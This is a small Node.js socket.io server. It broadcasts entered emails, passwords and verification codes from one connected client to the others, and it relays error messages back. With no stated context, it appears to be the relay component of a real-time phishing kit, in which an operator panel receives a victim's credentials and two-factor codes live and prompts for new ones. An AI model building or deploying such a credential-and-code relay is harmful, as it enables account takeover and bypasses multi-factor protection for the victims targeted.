const { createServer } = require('http');
const { Server } = require('socket.io');

const httpServer = createServer();
const io = new Server(httpServer, {
	cors: {
		origin: '*',
	},
});

io.on('connection', (socket) => {
	console.log(`⚡: ${socket.id} user just connected! ${getCurrentTime()}`);

	socket.on('disconnect', () => {
		console.log('🔥: A user disconnected ', getCurrentTime());
	});

	socket.on('entered-email', (req) => {
		socket.broadcast.emit('send-email', req);
	});

	socket.on('entered-password', (req) => {
		socket.broadcast.emit('send-pass', req);
	});

	socket.on('entered-code', (req) => {
		socket.broadcast.emit('send-code', req);
	});

	socket.on('error-email', (req) => {
		socket.broadcast.emit('send-email-error', req);
	});

	socket.on('error-password', (req) => {
		socket.broadcast.emit('send-password-error', req);
	});

	socket.on('error-code', (req) => {
		socket.broadcast.emit('send-code-error', req);
	});
});

httpServer.listen(3023, () => {
	console.log('Server is running...');
});

function getCurrentTime() {
	const now = new Date();
	let hours = now.getHours();
	const minutes = now.getMinutes();
	const ampm = hours >= 12 ? 'pm' : 'am';

	hours = hours % 12;
	hours = hours ? hours : 12; // the hour '0' should be '12'
	const minutesStr = minutes < 10 ? '0' + minutes : minutes;

	return hours + ':' + minutesStr + ampm;
}
